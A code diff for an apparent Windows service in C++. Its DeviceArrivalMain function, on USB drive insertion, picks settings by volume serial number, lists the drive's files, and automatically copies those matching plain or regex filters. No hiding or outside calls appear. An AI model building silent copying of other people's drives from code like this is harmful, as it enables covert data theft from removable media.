@@ -19,55 +19,48 @@
 using namespace std;
 using namespace filesystem;
 
+typedef SystemConfig::ListenMode ListenMode;
+typedef SystemConfig::ConfigData ConfigData;
+typedef SystemConfig::ConfigData::DeviceConfig DeviceConfig;
+
 void DeviceArrivalMain(TCHAR DriveLetter) {
 	SystemConfig* config = SystemConfig::getInstance();
 	Device dv(DriveLetter);
 	Device::DiskInformation info = dv.GetDiskInformation();
 	unsigned int SN = info.VolumeSerialNumber;
-	/*
-	switch (config->ListenSN) {
-	case SystemConfig::SNMode::DISABLED:
+	ConfigData data = config->readConfig();
+
+	if (!data.Service.Enabled)
 		return;
-	case SystemConfig::SNMode::EXCEPTATIONS:
-		for (unsigned int i : config->SNFilter) {
-			if (i == SN) {
-				return;
-			}
+
+	vector<DeviceConfig> &deviceExcept = data.Service.DeviceConfig;
+	DeviceConfig sdc = data.Service.DefaultConfig;
+	for (const DeviceConfig& cfg : deviceExcept) {
+		if (cfg.SerialNumber == SN) {
+			sdc = cfg;
+			break;
 		}
-		break;
-	case SystemConfig::SNMode::LISTENLIST:
-		for (unsigned int i : config->SNFilter) {
-			if (i == SN) {
-				break;
-			}
-		}
-		return;
 	}
+	if (sdc.ListenMode == ListenMode::DISABLED)
+		return;
+
 	FileLister lister(dv);
-	shared_ptr<list<FileData>> pls = lister.ListFile();
-	FileSearcher fs;
-	shared_ptr<list<FileData>> psls;
-	if (config->NormalCopy) {
-		psls = fs.FindFileRegex(pls, SystemConfig::getInstance()->NormalCopyFilters);
-		FileCopyer cp(dv, psls);
-		cp.ListFile(pls);
-		if (SystemConfig::getInstance()->FileCopyer) {
-			cp.Copy();
-		}
+	shared_ptr<list<FileData>> list = lister.ListFile();
+	FileCopyer copyer(dv);
+	FileSearcher searcher;
+	if (sdc.FileListerEnabled) {
+		copyer.ListFile(list);
 	}
-	if (config->RegexCopy) {
-		psls = fs.FindFileRegex(pls, SystemConfig::getInstance()->RegexCopyFilters);
-		FileCopyer cp(dv, psls);
-		cp.ListFile(pls);
-		if (SystemConfig::getInstance()->FileCopyer) {
-			cp.Copy();
-		}
+	if (sdc.FileCopyer.NormalCopyEnabled) {
+		auto ptr = searcher.FindFile(list, sdc.FileCopyer.NormalFilters);
+		copyer.setPaths(ptr);
+		copyer.Copy(sdc.Limit.MaxSize, sdc.Limit.MaxCount);
 	}
-	if (!config->RegexCopy && !config->NormalCopy) {
-		FileCopyer cp(dv, psls);
-		cp.ListFile(pls);
+	if (sdc.FileCopyer.RegexCopyEnabled) {
+		auto ptr = searcher.FindFileRegex(list, sdc.FileCopyer.RegexFilters);
+		copyer.setPaths(ptr);
+		copyer.Copy(sdc.Limit.MaxSize, sdc.Limit.MaxCount);
 	}
-	*/
 }
 
 void DeviceRemovalMain(TCHAR DriveLetter) {
